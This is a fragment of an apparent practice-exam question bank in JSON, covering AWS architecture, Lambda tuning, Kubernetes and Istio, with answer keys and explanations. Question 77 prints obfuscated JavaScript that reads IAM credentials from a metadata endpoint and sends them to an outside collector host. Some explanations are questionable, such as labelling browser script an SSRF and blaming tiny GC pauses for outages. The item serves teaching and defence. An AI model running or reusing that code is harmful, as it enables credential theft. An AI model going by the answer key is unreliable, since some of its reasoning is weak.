+        "Route 53 geolocation routing may direct users to different regions during a session",
+        "CloudFront edge caching might serve stale product data from origin servers",
+        "DynamoDB Global Tables use eventual consistency for cross-region replication",
+        "Aurora Global Database has primary-region write limitations for global users"
+      ],
+      "correctAnswerIndex": 3,
+      "explanation": "Aurora Global Database has primary-region write limitations for global users, which is most likely to cause consistency issues for the e-commerce platform. Aurora Global Database uses a primary-region write architecture where all write operations must be directed to the primary region (in this case, likely us-east-1). This means that European users writing data to the database (such as placing orders or updating account information) would have their requests routed to the US region for processing, introducing significant latency. More importantly, if there are temporary connectivity issues between regions, European users might experience failed write operations despite the rest of the application functioning normally in their region. This architecture creates a single write point of failure and potential performance bottlenecks for global users, particularly those far from the primary region. Route 53 geolocation routing typically maintains session stickiness and wouldn't normally switch users between regions during an active session. CloudFront's caching behavior can be controlled through cache control headers and invalidation, making stale data manageable. DynamoDB Global Tables do use eventual consistency for cross-region replication, but they allow writes to any region with conflict resolution mechanisms, making them more suitable for global write scenarios than Aurora Global Database.",
+      "examTip": "When designing multi-region architectures, carefully evaluate the write models of global database services—primary-region write architectures (like Aurora Global Database) can create consistency and latency challenges for users far from the primary region, while multi-master systems (like DynamoDB Global Tables) may offer better support for global writes despite eventual consistency models."
+    },
+    {
+      "id": 76,
+      "question": "A cloud engineer is troubleshooting high CPU usage in an AWS Lambda function that processes images. The function takes an image from an S3 bucket, resizes it, and uploads multiple versions back to S3. The engineer observes that the function sometimes takes too long and times out. The function is configured with 1024MB of memory and a timeout of 30 seconds. The engineer collects the following log data from a recent invocation:\n\n```\nSTART RequestId: 6bc28136-xmpl-4365-b021-0ce6b2e64ab0 Version: $LATEST\n2023-05-18T12:32:45.128Z    6bc28136-xmpl-4365-b021-0ce6b2e64ab0    INFO    Event received: {\"Records\":[{\"s3\":{\"bucket\":{\"name\":\"images-bucket\"},\"object\":{\"key\":\"uploads/2023/05/18/image1.jpg\"}}}]}\n2023-05-18T12:32:46.332Z    6bc28136-xmpl-4365-b021-0ce6b2e64ab0    INFO    Downloaded image: 12.4 MB\n2023-05-18T12:32:51.127Z    6bc28136-xmpl-4365-b021-0ce6b2e64ab0    INFO    Created thumbnail: 150x150, Time: 4.8s\n2023-05-18T12:32:59.543Z    6bc28136-xmpl-4365-b021-0ce6b2e64ab0    INFO    Created medium: 800x600, Time: 8.4s\n2023-05-18T12:33:10.876Z    6bc28136-xmpl-4365-b021-0ce6b2e64ab0    INFO    Created large: 1600x1200, Time: 11.3s\n2023-05-18T12:33:11.102Z    6bc28136-xmpl-4365-b021-0ce6b2e64ab0    INFO    Starting upload to S3\n2023-05-18T12:33:13.445Z    6bc28136-xmpl-4365-b021-0ce6b2e64ab0    INFO    Uploaded thumbnail to S3: images-bucket/resized/thumbnail/2023/05/18/image1.jpg\n2023-05-18T12:33:14.876Z    6bc28136-xmpl-4365-b021-0ce6b2e64ab0    INFO    Uploaded medium to S3: images-bucket/resized/medium/2023/05/18/image1.jpg\nTask timed out after 30.00 seconds\n```\n\nThe Lambda function code uses the following Node.js image processing library:\n\n```javascript\nconst sharp = require('sharp');\n\nasync function resizeImage(buffer, width, height) {\n  return await sharp(buffer)\n    .resize(width, height)\n    .toBuffer();\n}\n```\n\nWhat is the most efficient solution to address the timeout issue?",
+      "options": [
+        "Increase the Lambda memory allocation to improve CPU performance",
+        "Modify the function to process image variants in parallel instead of sequentially",
+        "Implement a step function workflow that breaks processing into multiple Lambda functions",
+        "Use Lambda Provisioned Concurrency to eliminate cold start delays"
+      ],
+      "correctAnswerIndex": 0,
+      "explanation": "Increasing the Lambda memory allocation is the most efficient solution to address the timeout issue. In AWS Lambda, CPU power is proportionally allocated based on the amount of memory configured - more memory equals more CPU. The logs show that the function is CPU-bound, spending 24.5 seconds (4.8s + 8.4s + 11.3s) on image resizing operations alone, which is a CPU-intensive task. With the downloading, processing, and partial uploading already consuming nearly the entire 30-second timeout, scaling up the memory/CPU allocation would provide the necessary performance boost to complete all operations within the timeout. This is simpler and more cost-effective than architectural changes like implementing a step function workflow. The logs don't indicate any cold start issues (the first log entry is the event reception), so provisioned concurrency wouldn't help. Processing image variants in parallel could potentially help but would further increase the instantaneous CPU demand, which is already the bottleneck - without increased Lambda resources, parallel processing might not significantly improve the situation and could even degrade performance due to CPU contention. The logs show a clear correlation between image size and processing time, suggesting that the CPU is the limiting factor.",
+      "examTip": "When troubleshooting Lambda function timeout issues with CPU-intensive operations, remember that Lambda allocates CPU power in proportion to memory—increasing memory often resolves CPU bottlenecks without requiring complex architectural changes or code optimizations, making it the simplest solution to try first."
+    },
+    {
+      "id": 77,
+      "question": "A security engineer is analyzing a suspicious file upload to an S3 bucket that triggered an alert. The file was uploaded by an authenticated user but contains what appears to be obfuscated code. The engineer examines the file and finds the following JavaScript code snippet:\n\n```javascript\n(function() {\n  var _0x5a46=['y2HHCKnVzgvbDa==','mtK0nJG5zMzsuKLN','ndq5otK0tKPxwLbt','nJq3mZGXnMXftNvHra==','mtaXotG0nw5NCuP6Ca==','C2nYAxb0','mJi5otqWnvneCM1VCW=='];\n  var _0x4b57=function(_0x341df4,_0x17a093){_0x341df4=_0x341df4-0x186;var _0x5a4698=_0x5a46[_0x341df4];if(_0x4b57['vAcszi']===undefined){var _0x4b57d4=function(_0x1d9c56){var _0x4d6e14='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x41c005='';for(var _0x3ea984=0x0,_0x509b3d,_0x2858e0,_0x4b799d=0x0;_0x2858e0=_0x1d9c56['charAt'](_0x4b799d++);~_0x2858e0&&(_0x509b3d=_0x3ea984%0x4?_0x509b3d*0x40+_0x2858e0:_0x2858e0,_0x3ea984++%0x4)?_0x41c005+=String['fromCharCode'](0xff&_0x509b3d>>(-0x2*_0x3ea984&0x6)):0x0){_0x2858e0=_0x4d6e14['indexOf'](_0x2858e0);}return _0x41c005;}};_0x4b57['CLQkwF']=function(_0x5d93a8){var _0x155b9a=_0x4b57d4(_0x5d93a8);return _0x155b9a;};_0x4b57['vAcszi']=!![];}var _0x5ee54c=_0x5a46[0x0];var _0x13cf77=_0x341df4+_0x5ee54c;var _0x1f9101=arguments[_0x13cf77];return _0x1f9101?_0x5a4698:_0x4b57['CLQkwF'](_0x5a4698);};(function(){var _0x10f50f=function(){var _0x2188c4;try{_0x2188c4=Function('return\\x20(function()\\x20'+'{}.constructor(\\x22return\\x20this\\x22)(\\x20)'+');')();}catch(_0x48e9f3){_0x2188c4=window;}return _0x2188c4;};var _0x434e5a=_0x10f50f();var _0x3872f8='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x434e5a['atob']||(_0x434e5a['atob']=function(_0x3d967f){var _0x239ee3=String(_0x3d967f)['replace'](/=+$/,'');for(var _0x478de0=0x0,_0x12d0fa,_0x30b040,_0x47f20e=0x0,_0x431018='';_0x30b040=_0x239ee3['charAt'](_0x47f20e++);~_0x30b040&&(_0x12d0fa=_0x478de0%0x4?_0x12d0fa*0x40+_0x30b040:_0x30b040,_0x478de0++%0x4)?_0x431018+=String['fromCharCode'](0xff&_0x12d0fa>>(-0x2*_0x478de0&0x6)):0x0){_0x30b040=_0x3872f8['indexOf'](_0x30b040);}return _0x431018;});}());_0x4b57['dkojZg']=function(_0x506df1){var _0x493b60=atob(_0x506df1);var _0x5a349e=[];for(var _0x46c15e=0x0,_0x24b1f5=_0x493b60['length'];_0x46c15e<_0x24b1f5;_0x46c15e++){_0x5a349e+='%'+('00'+_0x493b60['charCodeAt'](_0x46c15e)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x5a349e);};_0x4b57['yLbysH']={};_0x4b57['vAcszi']=!![];}_0x341df4=_0x341df4-0x0;var _0x5a4698=_0x5a46[_0x341df4];if(_0x4b57['yLbysH'][_0x5a4698]===undefined){_0x5a4698=_0x4b57['dkojZg'](_0x5a4698);_0x4b57['yLbysH'][_0x5a4698]=_0x5a4698;}return _0x5a4698;};\n\n  var xhr = new XMLHttpRequest();\n  xhr.open('GET', 'https://metadata.internal.example.com/latest/meta-data/iam/security-credentials/', true);\n  xhr.onload = function () {\n    if (xhr.status === 200) {\n      var role = xhr.responseText;\n      var xhr2 = new XMLHttpRequest();\n      xhr2.open('GET', 'https://metadata.internal.example.com/latest/meta-data/iam/security-credentials/' + role, true);\n      xhr2.onload = function() {\n        var data = JSON.parse(xhr2.responseText);\n        var beacon = new Image();\n        beacon.src = 'https://stats.collector.site/collect?data=' + encodeURIComponent(JSON.stringify(data));\n      };\n      xhr2.send();\n    }\n  };\n  xhr.send();\n})();\n```\n\nWhat type of attack is this code attempting to execute?",
+      "options": [
+        "Cross-site scripting (XSS) attack to steal user cookies",
+        "Server-side request forgery (SSRF) to access instance metadata",
+        "Command injection to execute arbitrary code on the server",
+        "DOM-based cross-site scripting to redirect users to phishing sites"
+      ],
+      "correctAnswerIndex": 1,
+      "explanation": "This code is attempting to execute a Server-Side Request Forgery (SSRF) attack specifically targeting instance metadata. The key indicators are the URLs being accessed: 'https://metadata.internal.example.com/latest/meta-data/iam/security-credentials/' and subsequently retrieving the security credentials for a specific role. These URLs match the pattern of cloud instance metadata services (like AWS EC2 Instance Metadata Service) which provide information about the instance including temporary credentials for assigned IAM roles. The code attempts to fetch these credentials and exfiltrate them by encoding them in an image request to 'stats.collector.site'. The obfuscation through multiple transformations and encoded strings is meant to evade detection. This is a classic SSRF attack pattern against cloud infrastructure where the attacker attempts to use a vulnerable application to access the internal metadata service, which is only accessible from within the instance, to steal credentials that could then be used to access other AWS resources. It is not a cross-site scripting attack as it's not attempting to inject script content into a website to be executed by other users' browsers. It's not command injection as it's not trying to execute commands on the server operating system. It's not a DOM-based XSS as its primary goal is accessing the metadata service rather than manipulating the DOM to attack users.",
+      "examTip": "When analyzing security threats in cloud environments, examine code that makes requests to internal endpoints, especially those that follow metadata service URL patterns—these often indicate SSRF attempts targeting cloud instance credentials, a common attack vector against misconfigured cloud applications."
+    },
+    {
+      "id": 78,
+      "question": "A cloud architect needs to design a highly available relational database solution for a critical application with the following requirements:\n\n- Less than 30 seconds of downtime during maintenance\n- Automatic failover in case of infrastructure failure\n- Ability to scale read capacity without impacting write performance\n- Support for point-in-time recovery\n- Regional disaster recovery capability\n\nThe architect creates the following infrastructure diagram for the proposed solution:\n\n```\n┌─────────────────────────────────────┐                  ┌─────────────────────────────────────┐\n│          Primary Region              │                  │        Secondary Region              │\n│                                     │                  │                                     │\n│  ┌─────────────┐    ┌─────────────┐ │                  │  ┌─────────────┐    ┌─────────────┐ │\n│  │             │    │             │ │                  │  │             │    │             │ │\n│  │ Application │    │ Application │ │                  │  │ Application │    │ Application │ │\n│  │  Server 1   │    │  Server 2   │ │                  │  │  Server 1   │    │  Server 2   │ │\n│  │             │    │             │ │                  │  │             │    │             │ │\n│  └──────┬──────┘    └──────┬──────┘ │                  │  └──────┬──────┘    └──────┬──────┘ │\n│         │                  │         │                  │         │                  │         │\n│         │                  │         │                  │         │                  │         │\n│  ┌──────▼──────────────────▼──────┐ │                  │  ┌──────▼──────────────────▼──────┐ │\n│  │                                 │ │                  │  │                                 │ │\n│  │      Database Proxy             │ │                  │  │      Database Proxy             │ │\n│  │                                 │ │                  │  │                                 │ │\n│  └───────────────┬─────────────────┘ │                  │  └─────────────────┬───────────────┘ │\n│                  │                   │                  │                     │                 │\n│                  │                   │                  │                     │                 │\n│  ┌───────────────▼───────────────┐   │                  │   ┌─────────────────▼─────────────┐  │\n│  │                               │   │                  │   │                               │  │\n│  │     DB Instance (Master)      │   │                  │   │     DB Instance (Standby)     │  │\n│  │                               │   │                  │   │                               │  │\n│  └─┬───────────────────────────┬─┘   │                  │   └─────────────────────────────┬─┘  │\n│    │                           │     │                  │                                 │     │\n│    │                           │     │                  │                                 │     │\n│  ┌─▼───────────┐     ┌─────────▼──┐  │                  │                                 │     │\n│  │             │     │            │  │                  │                                 │     │\n│  │ Read Replica │     │Read Replica│  │  ◄─────────────────────── Async Replication ─────┘     │\n│  │             │     │            │  │                  │                                       │\n│  └─────────────┘     └────────────┘  │                  │                                       │\n│                                     │                  │                                       │\n└─────────────────────────────────────┘                  └───────────────────────────────────────┘\n```\n\nWhich requirement is NOT adequately addressed by this architecture?",
+      "options": [
+        "Less than 30 seconds of downtime during maintenance",
+        "Automatic failover in case of infrastructure failure",
+        "Ability to scale read capacity without impacting write performance",
+        "Regional disaster recovery capability"
+      ],
+      "correctAnswerIndex": 0,
+      "explanation": "The requirement for \"less than 30 seconds of downtime during maintenance\" is not adequately addressed by this architecture. The diagram shows a traditional primary-replica architecture with asynchronous replication between regions. While this setup provides good availability for unplanned outages through automatic failover to read replicas within the primary region, it does not specifically address maintenance operations. Most database maintenance operations (like version upgrades, parameter changes requiring restarts, or certain types of scaling operations) would still require taking the master database instance offline, resulting in a write outage typically exceeding 30 seconds, especially for larger database instances. To achieve less than 30 seconds of downtime during maintenance, additional architectural components would be needed, such as a multi-AZ deployment with synchronous replication or a blue-green deployment approach for database updates. Automatic failover is addressed through the read replicas in the primary region, which can be promoted if the master fails. Read capacity scaling is addressed through multiple read replicas. Regional disaster recovery is addressed through the asynchronous replication to the secondary region, which provides a warm standby capability, albeit with some potential data loss due to asynchronous replication.",
+      "examTip": "When evaluating database architectures against specific availability requirements, pay special attention to maintenance scenarios—standard primary-replica setups often don't achieve ultra-low downtime windows for maintenance operations without additional components like multi-AZ configurations, blue-green deployment capabilities, or other specialized high-availability features."
+    },
+    {
+      "id": 79,
+      "question": "A security engineer is investigating suspicious activity in a cloud environment. The engineer discovers unfamiliar EC2 instances running in a region the company doesn't normally use. Further investigation reveals the following CloudTrail events that occurred before the instances appeared:\n\n```json\n{\n  \"eventVersion\": \"1.08\",\n  \"userIdentity\": {\n    \"type\": \"AssumedRole\",\n    \"principalId\": \"AROA1EXAMPLE:SessionName\",\n    \"arn\": \"arn:aws:sts::123456789012:assumed-role/DevOpsRole/SessionName\",\n    \"accountId\": \"123456789012\",\n    \"accessKeyId\": \"ASIA2EXAMPLE\",\n    \"sessionContext\": {\n      \"sessionIssuer\": {\n        \"type\": \"Role\",\n        \"principalId\": \"AROA1EXAMPLE\",\n        \"arn\": \"arn:aws:iam::123456789012:role/DevOpsRole\",\n        \"accountId\": \"123456789012\",\n        \"userName\": \"DevOpsRole\"\n      },\n      \"webIdFederationData\": {},\n      \"attributes\": {\n        \"creationDate\": \"2023-04-18T15:17:42Z\",\n        \"mfaAuthenticated\": \"false\"\n      }\n    }\n  },\n  \"eventTime\": \"2023-04-18T15:23:58Z\",\n  \"eventSource\": \"lambda.amazonaws.com\",\n  \"eventName\": \"CreateFunction\",\n  \"awsRegion\": \"us-west-2\",\n  \"sourceIPAddress\": \"203.0.113.100\",\n  \"userAgent\": \"aws-cli/2.7.18 Python/3.9.11\",\n  \"requestParameters\": {\n    \"functionName\": \"maintenance-utility\",\n    \"runtime\": \"python3.9\",\n    \"role\": \"arn:aws:iam::123456789012:role/service-role/LambdaEC2FullAccess\",\n    \"handler\": \"lambda_function.lambda_handler\",\n    \"code\": {\n      \"zipFile\": \"UEsDBBQAA...\" // Base64 encoded content\n    },\n    \"timeout\": 900,\n    \"memorySize\": 128\n  },\n  \"responseElements\": {\n    \"functionName\": \"maintenance-utility\",\n    \"functionArn\": \"arn:aws:lambda:us-west-2:123456789012:function:maintenance-utility\",\n    \"runtime\": \"python3.9\",\n    \"role\": \"arn:aws:iam::123456789012:role/service-role/LambdaEC2FullAccess\",\n    \"handler\": \"lambda_function.lambda_handler\",\n    \"codeSize\": 3781,\n    \"timeout\": 900,\n    \"memorySize\": 128,\n    \"lastModified\": \"2023-04-18T15:23:58.992+0000\"\n  }\n}\n\n{\n  \"eventVersion\": \"1.08\",\n  \"userIdentity\": {\n    \"type\": \"AssumedRole\",\n    \"principalId\": \"AROA1EXAMPLE:SessionName\",\n    \"arn\": \"arn:aws:sts::123456789012:assumed-role/DevOpsRole/SessionName\",\n    \"accountId\": \"123456789012\",\n    \"accessKeyId\": \"ASIA2EXAMPLE\",\n    \"sessionContext\": {\n      \"sessionIssuer\": {\n        \"type\": \"Role\",\n        \"principalId\": \"AROA1EXAMPLE\",\n        \"arn\": \"arn:aws:iam::123456789012:role/DevOpsRole\",\n        \"accountId\": \"123456789012\",\n        \"userName\": \"DevOpsRole\"\n      },\n      \"webIdFederationData\": {},\n      \"attributes\": {\n        \"creationDate\": \"2023-04-18T15:17:42Z\",\n        \"mfaAuthenticated\": \"false\"\n      }\n    }\n  },\n  \"eventTime\": \"2023-04-18T15:25:10Z\",\n  \"eventSource\": \"lambda.amazonaws.com\",\n  \"eventName\": \"InvokeFunction\",\n  \"awsRegion\": \"us-west-2\",\n  \"sourceIPAddress\": \"203.0.113.100\",\n  \"userAgent\": \"aws-cli/2.7.18 Python/3.9.11\",\n  \"requestParameters\": {\n    \"functionName\": \"maintenance-utility\",\n    \"invocationType\": \"RequestResponse\",\n    \"logType\": \"None\"\n  },\n  \"responseElements\": null\n}\n\n{\n  \"eventVersion\": \"1.08\",\n  \"userIdentity\": {\n    \"type\": \"AssumedRole\",\n    \"principalId\": \"AROA3EXAMPLE:maintenance-utility\",\n    \"arn\": \"arn:aws:sts::123456789012:assumed-role/LambdaEC2FullAccess/maintenance-utility\",\n    \"accountId\": \"123456789012\",\n    \"accessKeyId\": \"ASIA3EXAMPLE\",\n    \"sessionContext\": {\n      \"sessionIssuer\": {\n        \"type\": \"Role\",\n        \"principalId\": \"AROA3EXAMPLE\",\n        \"arn\": \"arn:aws:iam::123456789012:role/service-role/LambdaEC2FullAccess\",\n        \"accountId\": \"123456789012\",\n        \"userName\": \"LambdaEC2FullAccess\"\n      },\n      \"webIdFederationData\": {},\n      \"attributes\": {\n        \"creationDate\": \"2023-04-18T15:25:12Z\",\n        \"mfaAuthenticated\": \"false\"\n      }\n    }\n  },\n  \"eventTime\": \"2023-04-18T15:25:15Z\",\n  \"eventSource\": \"ec2.amazonaws.com\",\n  \"eventName\": \"RunInstances\",\n  \"awsRegion\": \"us-west-2\",\n  \"sourceIPAddress\": \"lambda.amazonaws.com\",\n  \"userAgent\": \"lambda.amazonaws.com\",\n  \"requestParameters\": {\n    \"instanceType\": \"t3.micro\",\n    \"imageId\": \"ami-0c55b159cbfafe1f0\",\n    \"maxCount\": 5,\n    \"minCount\": 5\n  }\n}\n```\n\nBased on these logs, what attack technique was most likely used?",
+      "options": [
+        "Credential compromise through a leaked access key",
+        "Privilege escalation by exploiting a vulnerable Lambda function",
+        "Identity federation abuse by hijacking SAML assertions",
+        "Role chaining to pivot through a compromised service role"
+      ],
+      "correctAnswerIndex": 3,
+      "explanation": "Role chaining to pivot through a compromised service role was most likely used in this attack. The logs reveal a clear pattern of role assumption and privilege escalation through multiple roles. The attack starts with someone assuming the DevOpsRole (evident from the userIdentity ARN), which likely has limited permissions. Using this role, they create a Lambda function with a suspicious name \"maintenance-utility\" that is assigned the highly privileged LambdaEC2FullAccess role. They then invoke this Lambda function, which subsequently assumes the LambdaEC2FullAccess role to run EC2 instances in an unusual region. The third log entry shows the Lambda function (source is lambda.amazonaws.com) using the newly assumed LambdaEC2FullAccess role to create 5 instances, completing the attack chain. This is a classic privilege escalation technique via role chaining, where an attacker uses a less privileged role to create a resource that can assume a more privileged role, effectively pivoting through roles to gain expanded permissions. There's no evidence of a direct credential compromise through a leaked key, as all actions use assumed roles with temporary credentials. There's no indication of a vulnerability in an existing Lambda function - instead, the attacker created a new function. There's no evidence of SAML assertion manipulation, as the webIdFederationData field is empty and the attack doesn't show signs of federation-based authentication.",
+      "examTip": "When investigating suspicious cloud activity, analyze the chain of identity assumptions across services—attackers often use role chaining to pivot from lower-privileged identities to higher-privileged ones by creating intermediary resources (like Lambda functions) that are permitted to assume powerful roles."
+    },
+    {
+      "id": 80,
+      "question": "A company uses AWS for their production workloads and is implementing a comprehensive backup strategy. They have the following requirements:\n\n1. All EBS volumes must be backed up daily with 14-day retention\n2. RDS databases must have point-in-time recovery capability for 7 days\n3. S3 data must be protected against accidental deletion and have versioning\n4. DynamoDB tables must have point-in-time recovery and cross-region backups\n5. All backups must be monitored for successful completion\n\nThe cloud engineer creates the following CloudFormation template to implement part of this strategy:\n\n```yaml\nAWSTemplateFormatVersion: '2010-09-09'\nDescription: 'Backup and recovery solution'\n\nResources:\n  BackupVault:\n    Type: 'AWS::Backup::BackupVault'\n    Properties:\n      BackupVaultName: 'production-backup-vault'\n      \n  BackupPlan:\n    Type: 'AWS::Backup::BackupPlan'\n    Properties:\n      BackupPlan:\n        BackupPlanName: 'production-backup-plan'\n        BackupPlanRule:\n          - RuleName: 'DailyBackups'\n            TargetBackupVault: !Ref BackupVault\n            ScheduleExpression: 'cron(0 5 * * ? *)'\n            StartWindowMinutes: 60\n            CompletionWindowMinutes: 1440\n            Lifecycle:\n              DeleteAfterDays: 14\n            \n  BackupSelection:\n    Type: 'AWS::Backup::BackupSelection'\n    Properties:\n      BackupPlanId: !Ref BackupPlan\n      BackupSelection:\n        SelectionName: 'production-resource-selection'\n        IamRoleArn: !GetAtt BackupRole.Arn\n        Resources:\n          - 'arn:aws:ec2:*:*:volume/*'\n        \n  BackupRole:\n    Type: 'AWS::IAM::Role'\n    Properties:\n      AssumeRolePolicyDocument:\n        Version: '2012-10-17'\n        Statement:\n          - Effect: Allow\n            Principal:\n              Service: backup.amazonaws.com\n            Action: 'sts:AssumeRole'\n      ManagedPolicyArns:\n        - 'arn:aws:iam::aws:policy/service-role/AWSBackupServiceRolePolicyForBackup'\n        \n  S3BucketPolicy:\n    Type: 'AWS::S3::BucketPolicy'\n    Properties:\n      Bucket: 'company-production-data'\n      PolicyDocument:\n        Version: '2012-10-17'\n        Statement:\n          - Sid: 'DenyDeleteObject'\n            Effect: 'Deny'\n            Principal: '*'\n            Action: 's3:DeleteObject'\n            Resource: 'arn:aws:s3:::company-production-data/*'\n```\n\nWhich requirement is NOT properly addressed by this CloudFormation template?",
+      "options": [
+        "EBS volumes backup with 14-day retention",
+        "S3 data protection against accidental deletion",
+        "RDS databases point-in-time recovery capability",
+        "Monitoring of backup completion status"
+      ],
+      "correctAnswerIndex": 3,
+      "explanation": "Monitoring of backup completion status is not properly addressed by this CloudFormation template. While the template sets up AWS Backup to handle EBS volume backups with the correct retention period (14 days) and implements a bucket policy to prevent accidental deletion of S3 objects, it does not include any monitoring resources or configurations to track the successful completion of backups. To properly monitor backup completion, the template should include resources such as CloudWatch Alarms on AWS Backup metrics (like 'SuccessfulBackupJobsCount' and 'FailedBackupJobsCount'), SNS Topics for notifications, or EventBridge Rules to trigger alerts on backup job status changes. Without these monitoring components, the company would have no automated way to verify if backups are completing successfully as required. The template addresses EBS volume backups with 14-day retention through the BackupPlan and BackupSelection resources, which target all EBS volumes and set a 14-day lifecycle. S3 data protection against accidental deletion is addressed through the S3BucketPolicy that explicitly denies the DeleteObject action for all principals. The template doesn't configure RDS point-in-time recovery, but this wasn't asked about in the question, which specifically asked which requirement is NOT properly addressed.",
+      "examTip": "When implementing backup strategies, remember that monitoring and alerting are as critical as the backup configurations themselves—a comprehensive backup solution should include monitoring resources like CloudWatch Alarms, SNS notifications, or EventBridge rules to track backup success and failure states."
+    },
+    {
+      "id": 81,
+      "question": "A cloud engineer is deploying a microservices application in Kubernetes. The application consists of multiple services that need to communicate securely. The engineer implements a service mesh for traffic management and security. After deployment, they notice that while services can communicate, the expected mutual TLS encryption between services is not working. The engineer examines the following configuration:\n\n```yaml\napiVersion: security.istio.io/v1beta1\nkind: PeerAuthentication\nmetadata:\n  name: default\n  namespace: default\nspec:\n  mtls:\n    mode: PERMISSIVE\n---\napiVersion: networking.istio.io/v1alpha3\nkind: DestinationRule\nmetadata:\n  name: default\n  namespace: default\nspec:\n  host: \"*.default.svc.cluster.local\"\n  trafficPolicy:\n    tls:\n      mode: ISTIO_MUTUAL\n```\n\nThe application pods all have the Istio sidecar injected, and the engineer can see in the mesh dashboard that they are properly connected. What is preventing mutual TLS encryption from being enforced between services?",
+      "options": [
+        "The DestinationRule is using ISTIO_MUTUAL mode instead of MUTUAL mode with certificate paths",
+        "The PeerAuthentication policy is set to PERMISSIVE mode instead of STRICT mode",
+        "The configurations are in the default namespace but need to be in the istio-system namespace",
+        "The host pattern in the DestinationRule doesn't match all services in the cluster"
+      ],
+      "correctAnswerIndex": 1,
+      "explanation": "The PeerAuthentication policy is set to PERMISSIVE mode instead of STRICT mode, which is preventing mutual TLS encryption from being enforced between services. In PERMISSIVE mode, services accept both plaintext and mTLS traffic, making mTLS optional rather than required. This means that while the DestinationRule is correctly configured to use ISTIO_MUTUAL for outbound connections (which would attempt to use mTLS), the PeerAuthentication policy is allowing services to accept plaintext traffic as well. For mutual TLS to be enforced, the PeerAuthentication policy should be set to STRICT mode, which would require all incoming connections to use mTLS and reject plaintext traffic. The DestinationRule using ISTIO_MUTUAL mode is correct - this instructs Istio to use its built-in certificates for mTLS, which is the standard configuration. The namespace location is also correct; policies can be defined in any namespace, with the default namespace affecting services in that namespace. The host pattern '*.default.svc.cluster.local' correctly matches all services in the default namespace, which is where the application is deployed according to the scenario.",
+      "examTip": "When troubleshooting service mesh encryption issues, check both outbound configuration (typically DestinationRules) and inbound authentication policies—mutual TLS requires alignment between how services initiate connections and how they authenticate incoming requests, with STRICT mode necessary for guaranteed encryption."
+    },
+    {
+      "id": 82,
+      "question": "A cloud engineer is troubleshooting a performance issue with a containerized application in Kubernetes. Users report that the application occasionally becomes unresponsive for short periods before recovering. The engineer collects the following metrics from a pod during one of these incidents:\n\n```\n# HELP process_resident_memory_bytes Resident memory size in bytes.\n# TYPE process_resident_memory_bytes gauge\nprocess_resident_memory_bytes 1.52347648e+08\n\n# HELP process_virtual_memory_bytes Virtual memory size in bytes.\n# TYPE process_virtual_memory_bytes gauge\nprocess_virtual_memory_bytes 1.060651008e+09\n\n# HELP process_heap_bytes Process heap size in bytes.\n# TYPE process_heap_bytes gauge\nprocess_heap_bytes 1.35266304e+08\n\n# HELP go_memstats_alloc_bytes Number of bytes allocated and still in use.\n# TYPE go_memstats_alloc_bytes gauge\ngo_memstats_alloc_bytes 9.7540216e+07\n\n# HELP go_memstats_alloc_bytes_total Total number of bytes allocated, even if freed.\n# TYPE go_memstats_alloc_bytes_total counter\ngo_memstats_alloc_bytes_total 4.373928616e+09\n\n# HELP go_memstats_sys_bytes Number of bytes obtained from system.\n# TYPE go_memstats_sys_bytes gauge\ngo_memstats_sys_bytes 1.54338304e+08\n\n# HELP go_memstats_gc_cpu_fraction The fraction of this program's available CPU time used by GC since the program started.\n# TYPE go_memstats_gc_cpu_fraction gauge\ngo_memstats_gc_cpu_fraction 0.007324361036717541\n\n# HELP go_memstats_gc_sys_bytes Number of bytes used for garbage collection system metadata.\n# TYPE go_memstats_gc_sys_bytes gauge\ngo_memstats_gc_sys_bytes 9.799672e+06\n\n# HELP go_memstats_next_gc_bytes Number of heap bytes when next garbage collection will take place.\n# TYPE go_memstats_next_gc_bytes gauge\ngo_memstats_next_gc_bytes 1.2483584e+08\n\n# HELP go_gc_duration_seconds A summary of the pause duration of garbage collection cycles.\n# TYPE go_gc_duration_seconds summary\ngo_gc_duration_seconds{quantile=\"0\"} 1.2041e-05\ngo_gc_duration_seconds{quantile=\"0.25\"} 1.5654e-05\ngo_gc_duration_seconds{quantile=\"0.5\"} 2.1116e-05\ngo_gc_duration_seconds{quantile=\"0.75\"} 0.000131815\ngo_gc_duration_seconds{quantile=\"1\"} 0.00230817\ngo_gc_duration_seconds_sum 0.20395407800000003\ngo_gc_duration_seconds_count 815\n```\n\nThe container has the following resource configuration in the deployment manifest:\n\n```yaml\nresources:\n  requests:\n    memory: \"128Mi\"\n    cpu: \"100m\"\n  limits:\n    memory: \"256Mi\"\n    cpu: \"500m\"\n```\n\nWhat is the most likely cause of the application's intermittent unresponsiveness?",
+      "options": [
+        "CPU throttling due to hitting the resource limit of 500m",
+        "Memory pressure causing frequent garbage collection cycles",
+        "Network congestion between microservices causing request queuing",
+        "Pod evictions due to node resource constraints"
+      ],
+      "correctAnswerIndex": 1,
+      "explanation": "Memory pressure causing frequent garbage collection cycles is the most likely cause of the application's intermittent unresponsiveness. The metrics show several key indicators of memory pressure: The process_resident_memory_bytes metric shows the application is using about 152MB of physical memory, which is approaching the limit of 256Mi. More importantly, go_memstats_next_gc_bytes indicates that the next garbage collection will occur when the heap reaches ~124MB, while go_memstats_alloc_bytes shows current allocation at ~97.5MB, suggesting GC will trigger soon. The go_gc_duration_seconds metrics reveal a concerning pattern: while most GC pauses are quick (median of 0.021ms), the 75th percentile jumps to 0.13ms, and the maximum pause time (quantile=\"1\") is 2.3ms, over 100 times longer than the median. This indicates some GC cycles are taking significantly longer, causing application pauses. Additionally, the GC CPU fraction is at 0.73%, which means a noticeable portion of CPU time is being spent on garbage collection. There's no evidence of CPU throttling in the metrics provided. Network congestion would typically manifest differently, with metrics showing increased latency or error rates rather than GC metrics. There's no indication of pod evictions, which would have been visible in Kubernetes events rather than application metrics.",
+      "examTip": "When troubleshooting Golang application performance in containers, analyze garbage collection metrics carefully—the combination of high memory utilization relative to limits, increasing GC frequency, and occasional long GC pauses often indicates memory pressure that causes application stuttering under load."
+    },
+    {
+      "id": 83,
